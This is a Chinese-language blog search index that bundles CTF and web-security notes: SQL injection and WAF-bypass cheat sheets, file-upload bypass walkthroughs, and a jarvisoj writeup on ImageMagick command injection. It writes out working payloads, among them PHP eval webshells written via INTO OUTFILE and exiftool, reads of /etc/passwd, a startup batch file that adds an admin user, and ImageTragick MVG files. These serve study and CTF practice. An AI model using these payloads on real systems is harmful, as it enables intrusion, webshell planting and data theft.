<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[SQL注入（持续更新）]]></title>
    <url>%2F2018%2F10%2F13%2FSQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0)%2F</url>
    <content type="text"><![CDATA[MYSQL基础注入手工测试语句: 判断查询字段数：order by $ （$大于字段数会报错） 爆库：select database() –+/%23/# Select schema_name from information_schema.schemata –+ 爆表:select table_name from information_schema.tables where table_schema=(select database()) –+ 爆字段： select column_name from information_schema.columns where table_name=$table_name 查询值:select group_concat($column_name) from $table_name；结合limit 0,1 常用注入方式 联合查询：使前一句值为空联合查询展示所需要的信息。UNION 原始查询为空闭合的方式:根据类型进行使用单引号或者双引号闭合。And 0直接闭合 常用联合查询格式：’ union select database() –+ 报错注入：利用sql语句使数据库报错但是报错信息里含有sql语句的执行结果，常常应对一些注入不回显得情况 常用的报错函数：floor(rand(0))*2函数，extractvalue()函数，updatexml()函数，exp()函数等 floor(rand(x))*2:随机返回0-x之间的数值并进行去尾取整，执行两次。 利用该方法报错的原理：mysql建立临时查询表，经过group by产生重复记录报错。 Extractvalue()：对xml文档进行查询的函数。extractvalue(目标xml文档，xml路径)。select Db from db where Db=’test’ and (extractvalue(‘anything’,concat(‘~’,(select database()))));当extractvalue函数中的路径格式出错时，查询语句亦会执行进而导致报错注入。 Updatexml()：updatexml()函数与extractvalue()类似，是更新xml文档的函数。语法updatexml(目标xml文档，xml路径，更新的内容)，语句select username from security.user where id=1 and (updatexml(‘anything’,concat(‘~’,(select database())),’anything’))。 布尔(BOOLEAN)盲注:在没有数据回显的情况下，根据页面返回的true,flase进行判断语句执行结果是否正确。 布尔盲注的手法：利用逐位爆破猜解进行判断例如语句：select * from users where user=’xx’ and pass&gt;’123’#’。 辅助盲注的字符串函数： left(a,b)从左侧截取a的前b位：left(database(),1)&gt;’s’；Substr(a,b,c)从b位置开始，截取字符串a的c长度。Ascii（）将某个字符转换为ascii值：ascii(substr(user),1,1)=101#；Mid(a,b,c)从位置b开始，截取a字符串的c位；Regexp正则匹配：select user() regexp ’^ro；length IF语句：select * from users where id=1 and 1=(if((user() regexp ‘^r’),1,0)) 布尔盲注一般语句：and left(version(),1)=5 –+； 1’ and 1=(select 1 from information_schema.columns where 时间盲注：延时注入，使用sleep()根据页面返回时间进行判断 常用语句：if(asci(substr(database(),1,1))&gt;115,0,sleep(5))–+，可以结合char() 文件的导出:利用读取权限结合load_file(file_name)函数 文件导出常用语句：select -1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105)); Select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109))); -1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69); 1 union select 1,1,1,load_file(c:\boot.ini) 文件导入数据库常用语句：：load data infile ‘/tmp/t0.txt’ ignore into table t0 character set gbk fields terminated by ‘\t’ lines terminated by ‘\n’ 解释：fields terminated by 是每一项数据之间的分隔符，lines terminated by 是行的结尾符，当错误代码是2 的时候的时候，文件不存在，错误代码为13 的时候是没有权限，可以考虑/tmp 等文件夹。 导入到文件的常用语句：Select &lt;?php @eval($_post[“mima”])?&gt; into outfile “c:\phpnow\htdocs\test.php”， select load_file(‘c:\wamp\bin\mysql\mysql5.6.17\my.ini’)into outfile‘c:\wamp\www\test.php’ 前提：secure_file_priv选项配置不为null，select @@secure_file_priv;可以查询 绕过防护的各种骚操作 双写关键字 selselectect 大小写绕过 seLEct 编码绕过 利用ascii，hex，unicode,url等编码进行绕过，例如username=(char()+char())，extractvalue(0x)等 限制符号替代绕过 or和and使用||,&amp;&amp;；空格限制使用()&lt;&gt;/**/%a0,tab等代替，select(username)from(admin)；=&gt;&lt;限制使用in (1,2),between 1 and 3,like等绕过；select{a(database())}; 内联注释 /!*/或者多个/!一个*/闭合所有 截断 mysql对%00不截断 mysql··会被当做注释内容,利用反引号通常可以过掉一些正则和空格 静态资源绕过 利用对js,png,jpg等静态资源的后缀请求绕过/1.php/1.png?id=1 缓冲区溢出，利用部分waf对超长内容直接bypass的特性即使用大包溢出id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA) union select 1,2,schema_name from information_schema.SCHEMATA uri参数溢出 利用部分waf对传值参数检测个数有限的特征是哟个超量参数进行绕过，id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1 union select 1,2,schema_name %0a/!frominformation_schema.SCHEMATA GET-POST逻辑绕过 当同时提交GET与POST请求时进入POST逻辑导致绕过GET检测，/1.php?id=1 union select 1,2,schema_name from information_schema.SCHEMATA POST：aaa 宽字节二次编码绕过 %df%23 %25%27 参数污染 利用服务器对传参的处理漏洞，多次传值覆盖id=1&amp;id=2&amp;id=3&amp;id=4&amp;id=5&amp;id=select 1,user(),3 使用@符号，select @a:=database(); 二次注入 插入数据库中的转义符号不再被转义以及过长截断造成的二次注入 Mysql数字运算的隐蔽注入 讲查询内容结合函数转变成数字进行运算， select conv(hex(version()),16,10)=&gt;select unhex(conv(result,10,16))； mysql过长截断 mysql配置STRICT_ALL_TABLES未开启导致对超长值只提示warning并插入成功，导致的截断,insert into user values(‘admin ‘);截断成admin]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Upload总结记录（持续更新）]]></title>
    <url>%2F2018%2F09%2F16%2FUpload%E6%80%BB%E7%BB%93%E8%AE%B0%E5%BD%95(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0)%2F</url>
    <content type="text"><![CDATA[对前端JS防御的绕过上传 源代码1234567891011121314151617function checkFile() &#123; var file = document.getElementsByName(&apos;upload_file&apos;)[0].value; if (file == null || file == &quot;&quot;) &#123; alert(&quot;请选择要上传的文件!&quot;); return false; &#125; //定义允许上传的文件类型 var allow_ext = &quot;.jpg|.png|.gif&quot;; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;)); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) &#123; var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name; alert(errMsg); return false; &#125;&#125; 该JS通过document.getElementsByName()获取上传文件的文件名并通过file.lastIndexof寻找最后一个.并以之后的为扩展名与jpg,png,gif比对。 漏洞原因前端验证可以通过JS禁用绕过 突破手法通过访问firefox浏览器的about:config界面禁用JavaScript.enabled随后上传webshell $_FILES[][]的type验证绕过上传源代码1234567891011121314151617$is_upload = false;$msg = null;if (isset($_POST[&apos;submit&apos;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/jpeg&apos;) || ($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/png&apos;) || ($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/gif&apos;)) &#123; if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], UPLOAD_PATH . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) &#123; $img_path = UPLOAD_PATH . $_FILES[&apos;upload_file&apos;][&apos;name&apos;]; $is_upload = true; &#125; &#125; else &#123; $msg = &apos;文件类型不正确，请重新上传！&apos;; &#125; &#125; else &#123; $msg = UPLOAD_PATH.&apos;文件夹不存在,请手工创建！&apos;; &#125;&#125; 该代码通过$_FILES[‘upload_file’][‘type’]进行文件的类型验证，然后移动文件至上传路径保存 漏洞原因验证手法单一，可以通过对文件type进行抓包修改进而上传 突破手法通过burpsuite抓包修改其content-type为image/png突破限制 字符串函数对文件扩展名的限制绕过上传源代码123456789101112131415161718192021222324$is_upload = false;$msg = null;if (isset($_POST[&apos;submit&apos;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&apos;.asp&apos;,&apos;.aspx&apos;,&apos;.php&apos;,&apos;.jsp&apos;); $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &apos;.&apos;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], UPLOAD_PATH. &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) &#123; $img_path = UPLOAD_PATH .&apos;/&apos;. $_FILES[&apos;upload_file&apos;][&apos;name&apos;]; $is_upload = true; &#125; &#125; else &#123; $msg = &apos;不允许上传.asp,.aspx,.php,.jsp后缀文件！&apos;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;; &#125;&#125; 通过定义限制后缀的数组，通过trim移除两端空格，并deldot删除文件名末尾的点，并通过strrchr()定位最后一个点后的扩展名，strtolower()转换成小写，去除其静态属性值然后收尾去空接着转移至上传文件夹。 漏洞原因黑名单过滤，利用其遗漏的后缀名上传 突破手法改其扩展名为phtml,phtm,php1,php5等突破 利用.htaccess重写解析规则绕过上传源代码123456789101112131415161718192021222324$is_upload = false;$msg = null;if (isset($_POST[&apos;submit&apos;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;); $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &apos;.&apos;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], UPLOAD_PATH . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) &#123; $img_path = UPLOAD_PATH . $_FILES[&apos;upload_file&apos;][&apos;name&apos;]; $is_upload = true; &#125; &#125; else &#123; $msg = &apos;此文件不允许上传!&apos;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;; &#125;&#125; 该代码与上面类似，也采用了黑名单的验证并对其数组内容进行扩充，但遗漏.htaccess解析文件 漏洞原因该代码与上面类似，也采用了黑名单的验证并对其数组内容进行扩充，但遗漏.htaccess解析文件，且web服务器中AllowOverride All 突破手法重写.htaccess解析文件 内容为: 123&lt;FilesMatch &quot;shell.jpg&quot;&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 先上传该解析文件然后上传shell.jpg，虽然是图片的扩展名但是因为解析的缘故还是会按php解析]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>upload</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jarvisoj-图片上传漏洞_writeup以及imagick漏洞分析]]></title>
    <url>%2F2018%2F08%2F17%2Fjarvisoj-%E5%9B%BE%E7%89%87%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-writeup%2F</url>
    <content type="text"><![CDATA[题目地址:http://web.jarvisoj.com:32790 jarvisoj-图片上传漏洞_writeup先分享一下自己的思路对现在的web题，我个人通常采用的思路是，先进行目录以及其他敏感信息进行收集的同时进行手工测试。当下的web漏洞多是复合漏洞的利用，依靠单一漏洞capture flag的题目非常的少。而最常使用的结合就是phpinfo，.git,.svn等敏感配置文件或者源码文件的泄露结合题目的主要漏洞进行利用。这样的题目一来是避免了web的脑洞，二来也考察了做题人的基础水平以及利用基础性文件对漏洞的挖掘 信息收集我个人通常直接采用目录扫描工具的结合性扫描对网站的敏感文件进行自动化收集，扫描的同时进行手工测试，这里主要以该题进行说明。 同时在windows下和kali中使用工具进行结合扫描。在windows下使用御剑或者pk等对目录扫描，kali中使用dirb命令进行扫描。 可以发现除了上传口之外还有一个test.php，访问可发现是一个phpinfo的页面，然后进行快速分析，可以发现imagick的php拓展，因为该题以图片上传漏洞为主要背景，所以势必主要突破口还是在图片上，在刚刚的扫描时的手工测试，对上传口进行正常图片上传，木马伪装图片上传，修改mime类型，修改图片类型等变换的手工测试均失败，所以这题的上传漏洞主要漏洞势必不是在图片的上传绕过方面，主要问题可能在php第三方的拓展imagick对图片的处理过程中产生漏洞。 imagick漏洞分析由于对imagick只有一个肤浅的了解，参考网上资料https://www.anquanke.com/post/id/83872，https://www.2cto.com/article/201605/505823.html，两篇文章对该漏洞进行学习。 其中有关imagick漏洞主要有CVE-2016-3714、CVE-2016-3715、CVE-2016-3716、CVE-2016-3717。 imagick是一个使用非常广泛的图片处理软件。 在ImageMagick/delegates.xml中(delegare时调用外部lib来处理文件，其过程中调用system()命令进行执行)配置如下: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!--?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?--&gt;&lt;!--ELEMENT delegate (#PCDATA)--&gt;&lt;!--ATTLIST delegate decode CDATA #IMPLIED--&gt;&lt;!--ATTLIST delegate encode CDATA #IMPLIED--&gt;&lt;!--ATTLIST delegate mode CDATA #IMPLIED--&gt;&lt;!--ATTLIST delegate spawn CDATA #IMPLIED--&gt;&lt;!--ATTLIST delegate stealth CDATA #IMPLIED--&gt;&lt;!--ATTLIST delegate thread-support CDATA #IMPLIED--&gt;&lt;!--ATTLIST delegate command CDATA #REQUIRED--&gt;&lt;!-- Delegate command file. Commands which specify decode=&quot;in_format&quot; encode=&quot;out_format&quot; specify the rules for converting from in_format to out_format These rules may be used to translate directly between formats. Commands which specify only decode=&quot;in_format&quot; specify the rules for converting from in_format to some format that ImageMagick will automatically recognize. These rules are used to decode formats. Commands which specify only encode=&quot;out_format&quot; specify the rules for an &quot;encoder&quot; which may accept any input format. For delegates other than ps:*, pcl:*, and mpeg:* the substitution rules are as follows: %i input image filename %o output image filename %u unique temporary filename %Z unique temporary filename %# input image signature %b image file size %c input image comment %g image geometry %h image rows (height) %k input image number colors %l image label %m input image format %p page number %q input image depth %s scene number %w image columns (width) %x input image x resolution %y input image y resolution Set option delegate:bimodal=true to process bimodal delegates otherwise they are ignored. If stealth=&quot;True&quot; the delegate is not listed in user requested &quot;-list delegate&quot; listings. These are typically special internal delegates. If spawn=&quot;True&quot; ImageMagick will not way for the delegate to finish, nor will it read any output image. It will only wait for either the input file to be removed (See &quot;ephemeral:&quot; coder) indicating that the input file has been read, or a maximum time limit of 2 seconds.--&gt;&lt;delegatemap&gt; &lt;delegate command=&quot;&quot; decode=&quot;autotrace&quot; pnm=&quot;&quot; stealth=&quot;True&quot; svg=&quot;&quot;&gt; &lt;delegate command=&quot;&quot; decode=&quot;cdr&quot; delegate=&quot;&quot; http:=&quot;&quot; mv=&quot;&quot; png=&quot;&quot; ps=&quot;&quot; rm=&quot;&quot; spawn=&quot;True&quot; stealth=&quot;True&quot; www.imagemagick.org=&quot;&quot;&gt;&quot;%o&quot; 2&amp;gt; &quot;%Z&quot;&quot; decode=&quot;cgm&quot; thread-support=&quot;False&quot;&amp;gt; &lt;delegate command=&quot;&quot; decode=&quot;dvi&quot;&gt; &lt;delegate alternatives=&quot;&quot; color=&quot;&quot; command=&quot;&quot; decode=&quot;fig&quot; delegate=&quot;&quot; edit=&quot;&quot; encode=&quot;ps&quot; etc=&quot;&quot; image=&quot;&quot; load=&quot;&quot; mode=&quot;bi&quot; output=&quot;&quot; portrait=&quot;&quot; postscript=&quot;&quot; ps=&quot;&quot; set=&quot;&quot; size=&quot;&quot; stealth=&quot;True&quot; terminal=&quot;&quot; vi=&quot;&quot;&gt;&quot;%u&quot;;&quot;gnuplot&quot; &quot;%u&quot;&quot; decode=&quot;plt&quot;&amp;gt; &lt;delegate basename=&quot;&quot; command=&quot;&quot; decode=&quot;hpg&quot; eps=&quot;&quot; mv=&quot;&quot;&gt; &lt;delegate basename=&quot;&quot; command=&quot;if [ -e hp2xx -o -e /usr/bin/hp2xx ]; then hp2xx -q -m eps -f `basename&quot; decode=&quot;hpgl&quot; echo=&quot;&quot; else=&quot;&quot; exit=&quot;&quot; files=&quot;&quot; hp2xx=&quot;&quot; hpgl=&quot;&quot; install=&quot;&quot; mv=&quot;&quot; need=&quot;&quot; to=&quot;&quot; use=&quot;&quot; with=&quot;&quot; you=&quot;&quot;&gt; &lt;delegate command=&quot;&quot; decode=&quot;htm&quot;&gt; &lt;delegate command=&quot;&quot; decode=&quot;html&quot;&gt; &lt;delegate command=&quot;&quot; decode=&quot;https&quot;&gt; &lt;delegate command=&quot;&quot; decode=&quot;pcl:color&quot; delegate=&quot;&quot; encode=&quot;mpeg:encode&quot; pam=&quot;&quot; rawvideo=&quot;&quot; rd=&quot;&quot; s=&quot;&quot; sid=&quot;&quot; stealth=&quot;True&quot; tif=&quot;&quot;&gt; &lt;delegate command=&quot;&quot; decode=&quot;pcl:cmyk&quot; s=&quot;&quot; stealth=&quot;True&quot;&gt; &lt;delegate command=&quot;&quot; decode=&quot;pcl:mono&quot; s=&quot;&quot; stealth=&quot;True&quot;&gt; &lt;delegate command=&quot;&quot; decode=&quot;pdf&quot; encode=&quot;eps&quot; mode=&quot;bi&quot;&gt; &lt;delegate command=&quot;&quot; decode=&quot;pdf&quot; encode=&quot;ps&quot; mode=&quot;bi&quot;&gt; &lt;delegate command=&quot;&quot; decode=&quot;tiff&quot; encode=&quot;launch&quot; mode=&quot;encode&quot;&gt; &lt;delegate a=&quot;&quot; command=&quot;&quot; decode=&quot;pov&quot; delegate=&quot;&quot; encode=&quot;ilbm&quot; h=&quot;&quot; mode=&quot;encode&quot; q=&quot;&quot; w=&quot;&quot;&gt; &lt;delegate command=&quot;&quot; decode=&quot;ps&quot; encode=&quot;eps&quot; mode=&quot;bi&quot;&gt; &lt;delegate command=&quot;&quot; decode=&quot;ps&quot; encode=&quot;pdf&quot; mode=&quot;bi&quot;&gt; &lt;delegate command=&quot;lpr&quot; decode=&quot;ps&quot; encode=&quot;print&quot; mode=&quot;encode&quot;&gt; &lt;delegate command=&quot;&quot; decode=&quot;ps:alpha&quot; s=&quot;&quot; stealth=&quot;True&quot;&gt; &lt;delegate command=&quot;&quot; decode=&quot;ps:cmyk&quot; s=&quot;&quot; stealth=&quot;True&quot;&gt; &lt;delegate command=&quot;&quot; decode=&quot;ps:color&quot; s=&quot;&quot; stealth=&quot;True&quot;&gt; &lt;delegate command=&quot;&quot; decode=&quot;ps:mono&quot; s=&quot;&quot; stealth=&quot;True&quot;&gt; &lt;delegate command=&quot;&quot; decode=&quot;rgba&quot; encode=&quot;rle&quot; mode=&quot;encode&quot;&gt; &lt;delegate bin=&quot;&quot; command=&quot;&quot; decode=&quot;miff&quot; delegate=&quot;&quot; encode=&quot;show&quot; l=&quot;&quot; spawn=&quot;True&quot; usr=&quot;&quot;&gt; &lt;delegate command=&quot;&quot; decode=&quot;shtml&quot;&gt; &lt;delegate command=&quot;&quot; decode=&quot;svg&quot;&gt; &lt;delegate command=&quot;&quot; decode=&quot;txt&quot; encode=&quot;ps&quot; mode=&quot;bi&quot;&gt; &lt;delegate bin=&quot;&quot; command=&quot;&quot; decode=&quot;miff&quot; encode=&quot;win&quot; l=&quot;&quot; spawn=&quot;True&quot; stealth=&quot;True&quot; usr=&quot;&quot;&gt; &lt;delegate command=&quot;&quot; decode=&quot;wmf&quot;&gt; &lt;delegate command=&quot;&quot; decode=&quot;xps:color&quot; s=&quot;&quot; stealth=&quot;True&quot;&gt; &lt;delegate command=&quot;&quot; decode=&quot;xps:cmyk&quot; s=&quot;&quot; stealth=&quot;True&quot;&gt; &lt;delegate command=&quot;&quot; decode=&quot;xps:mono&quot; s=&quot;&quot; stealth=&quot;True&quot;&gt;&lt;/delegate&gt; &lt;/delegate&gt; &lt;/delegate&gt; &lt;/delegate&gt; &lt;/delegate&gt; &lt;/delegate&gt; &lt;/delegate&gt; &lt;/delegate&gt; &lt;/delegate&gt; &lt;/delegate&gt; &lt;/delegate&gt; &lt;/delegate&gt; &lt;/delegate&gt; &lt;/delegate&gt; &lt;/delegate&gt; &lt;/delegate&gt; &lt;/delegate&gt; &lt;/delegate&gt; &lt;/delegate&gt; &lt;/delegate&gt; &lt;/delegate&gt; &lt;/delegate&gt; &lt;/delegate&gt; &lt;/delegate&gt; &lt;/delegate&gt; &lt;/delegate&gt; &lt;/delegate&gt; &lt;/delegate&gt; &lt;/delegate&gt;&lt;/delegate&gt; &lt;/delegate&gt;&lt;/delegate&gt; &lt;/delegate&gt;&lt;/delegatemap&gt; %i input image filename %o output image filename %u unique temporary filename %Z unique temporary filename %# input image signature %b image file size %c input image comment %g image geometry %h image rows (height) %k input image number colors %l image label %m input image format %p page number %q input image depth %s scene number %w image columns (width) %x input image x resolution %y input image y resolution以上为该配置文件中对占位符的说明，其中根据资料的poc：该漏洞的主要问题出在采用占位符进行简单的拼接造成引号闭合执行系统命令。 漏洞利用CVE-2016-3714解析https图片的时候，使用了curl命令将其下载，我们看到%M被直接放在curl的最后一个参数内。ImageMagick默认支持一种图片格式，叫mvg，而mvg与svg格式类似，其中是以文本形式写入矢量图的内容，而这其中就可以包含https处理过程。 push graphic-context viewbox 0 0 640 480 fill ‘url(https://“|id; “)’ pop graphic-context CVE-2016-3718利用mvg格式中可以包含url的特点，进行SSRF攻击 push graphic-context viewbox 0 0 640 480 fill ‘url(https://example.com/)&#39; pop graphic-context CVE-2016-3715利用ImageMagick支持的ephemeral协议，来删除任意文件 push graphic-context viewbox 0 0 640 480 image over 0,0 0,0 ‘ephemeral:/tmp/delete.txt’ pop graphic-context CVE-2016-3716利用ImageMagick支持的msl协议，来进行文件的读取和写入。利用这个漏洞，可以将任意文件写为任意文件，比如将图片写为一个.php后缀的webshell。 file_move.mvg push graphic-context viewbox 0 0 640 480 image over 0,0 0,0 ‘msl:/tmp/msl.txt’popgraphic-context/tmp/msl.txt CVE-2016-3717本地文件读取push graphic-context viewbox 0 0 640 480 image over 0,0 0,0 ‘label:@/etc/hosts’ pop graphic-context png格式触发exif label处理： 正常的png图片，带上一个『恶意』的exif信息。在调用ImageMagick将其处理成.show文件的时候，即可触发命令注入漏洞。 exiftool -label=”\”|/usr/bin/id; \”” test.pngconvert test.png o.show 需要配置encode=“show”或者“win” 本题突破首先尝试前面几种命令执行的漏洞，构造了新突破在其中fill进事先上传的jpg链接进行转换然后执行，发现命令并没有执行，失败了。 然后发现题目中说最好使用png。联想到png格式触发的漏洞。/home/ctf/flag.txt，然后构造exiftool -label=”\”|/bin/echo \&lt;?php \@eval(\$_POST[x])\;?> &gt; /opt/lampp/htdocs/uploads/haha.php; \”” onein.png修改type为show]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>图片上传</tag>
        <tag>jarvisoj</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ROOTED-ME_Squared,Dot and next line writeup]]></title>
    <url>%2F2018%2F08%2F15%2FROOTED-ME-Squared-writeup%2F</url>
    <content type="text"><![CDATA[Squared这个还是比较简单常规，直接打开winhex文本pass Dot and next line这题还是充分说明了英语的重要，点在下一行。 flag是拆分的把.号的上一行拼接起来就ok，有的时候题很简单思路不要复杂，要是把DOT理解为像素点就复杂化了。]]></content>
      <categories>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>图片隐写</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[注入天书]]></title>
    <url>%2F2018%2F08%2F15%2F%E6%B3%A8%E5%85%A5%E5%A4%A9%E4%B9%A6%2F</url>
    <content type="text"><![CDATA[SQL注入原理脚本语言无法理解sql语句，两者对查询语句处理不一致导致sql注入，篡改sql语句原本逻辑。 常见防御过滤单引号、双引号、反斜杠、转义addslashes、mysqli_real_escape_string 变量绑定:`string sql = “select id,no from user where id=?”; PrepareStatement ps = conn.prepareStatement(sql); ps.setInt(1,id); ps.executeQuery();` #注入类型Union注入:有回显，可以看到某些字段的回显结果(通常)，猜解除字段数目，需要select注入 报错注入:页面输出，注入效率高，利用sql语句使数据库报错，保存信息中存在执行结果 常见报错函数: floor(Mysql):and select 1 from (select count(),concat(version(),floor(rand(0)2))x from information_schema.tables group by x)a); extractvalue(Mysql): andextractvalue(1,concat(0x5c,(selecttable_namefrominformation_schema.tableslimit1)));•updatexml(Mysql): and1=(updatexml(1,concat(0x3a,(select user())),1)) EXP：Exp(~(select * from (select user())a)) UTL_INADDR.get_host_address(Oracle):and 1=utl_inaddr.get_host_address((select banner() from sys.v_$version where rownum=1)) Boolean盲注:select * from users where user=’xx’ and pass&gt;’123’#’ Timing盲注：If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 基本语句库： union select 1,2,database()# 表: union select 1,table_name,3 from information_schema.tables where table_schema=’test’ limit 0,1# 列: union select 1,column_name,3 from information_schema.columns where table_name=’admin’ limit 0,1# 文件读写: 读取:select loadfile(‘/etc/passwd’); 写入: select ‘&lt;?php phpinfo();?&gt;’ into dumpfile ‘/var/www/html/1.php’(绝对路径) 命令执行: union select 1,2,3,” net user admin admin /ad” into outfile ‘c:\documents and strings\all users\start menu\programs\startup\add.bat’ WAF绕过双写关键字:selecselectt from 、OorR 大小写绕过:php中preg_match参数没有加i导致，SELeCT 编码绕过： acii:admin=(char(97)+char(100)+char(109)+char(105)+char(110))例如 select * from admin where username=(char(97)+char(100)+char(109)+char(105)+char(110)) 16进制:extractvalue(0x3C613E61646D696E3C2F613E,0x2f61) or=|| and=&amp;&amp; 无空格:select(username)from(admin) 科学计数法:where username=1e1union select =&lt;&gt;被限制:where id in (1,2)、where id between 1and 3,like access中使用dlookup 绕过select from (user=12’,info=dlookup(‘[user]’,’userinfo’,’[id]=1’)%00） 空格被限制:/**/、%a0、%0a、%0d、%09、tab 内联注释:select 1 from /!admin/ /!union/ select 2, mysql对%00不会截断:se%00lect 单一%号:再asp+iis中会被忽略:se%lect mysql反引号之间的会被当做注释内容，遇到[]或者中文表名查询需需要加 blacklist:! “ \ | 